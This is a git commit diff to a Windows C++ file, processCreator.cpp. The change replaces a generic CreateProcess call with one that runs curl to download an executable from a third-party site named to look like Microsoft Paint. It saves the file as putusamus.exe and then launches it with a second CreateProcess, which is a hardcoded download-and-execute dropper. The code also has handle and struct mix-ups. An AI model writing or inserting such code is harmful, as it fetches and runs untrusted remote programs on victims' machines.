f4f5e1d51f62a19953cf1db4d3cdc9516691fdb7
byeKhoXx <douha.ismael@gmail.com>
2020-11-18 21:13:46 +0100

    processCreator updated

--- processCreator.cpp
+++ processCreator.cpp
@@ -19,11 +19,41 @@ int _tmain( int argc, TCHAR *argv[] )
 
     // Start the child process. 
     if( !CreateProcess( NULL,   // No module name (use command line)
-        argv[1],        // Command line
+        "curl https://microsoft_paint.es.downloadastro.com/descarga/# -o C:\\Users\\IEUser\\Documents\\martisCode\\putusamus.exe",        // Command line
         NULL,           // Process handle not inheritable
         NULL,           // Thread handle not inheritable
         FALSE,          // Set handle inheritance to FALSE
-        0,              // No creation flags
+        NULL,              // No creation flags
+        NULL,           // Use parent's environment block
+        NULL,           // Use parent's starting directory 
+        &si,            // Pointer to STARTUPINFO structure
+        &pi )           // Pointer to PROCESS_INFORMATION structure
+    ) 
+    {
+        printf( "CreateProcess failed (%d).\n", GetLastError() );
+        return;
+    }
+
+     // Wait until child process exits.
+    WaitForSingleObject( pi.hProcess, INFINITE );
+    
+    // Close process and thread handles. 
+    CloseHandle( pi.hProcess );
+    CloseHandle( pi.hThread );
+    STARTUPINFO si2;
+    PROCESS_INFORMATION pi2;
+
+    ZeroMemory( &si2, sizeof(si2) );
+    si.cb = sizeof(si2);
+    ZeroMemory( &pi2, sizeof(pi2) );
+
+    // Start the child process. 
+    if( !CreateProcess( NULL,   // No module name (use command line)
+        "C:\\Users\\IEUser\\Documents\\martisCode\\putusamus.exe",        // Command line
+        NULL,           // Process handle not inheritable
+        NULL,           // Thread handle not inheritable
+        FALSE,          // Set handle inheritance to FALSE
+        NULL,              // No creation flags
         NULL,           // Use parent's environment block
         NULL,           // Use parent's starting directory 
         &si,            // Pointer to STARTUPINFO structure
@@ -35,9 +65,11 @@ int _tmain( int argc, TCHAR *argv[] )
     }
 
     // Wait until child process exits.
-    WaitForSingleObject( pi.hProcess, INFINITE );
+    WaitForSingleObject( pi2.hProcess, INFINITE ); //Probably should be removed
 
     // Close process and thread handles. 
-    CloseHandle( pi.hProcess );
-    CloseHandle( pi.hThread );
+    CloseHandle( pi2.hProcess );
+    CloseHandle( pi2.hThread );
+
+
 }
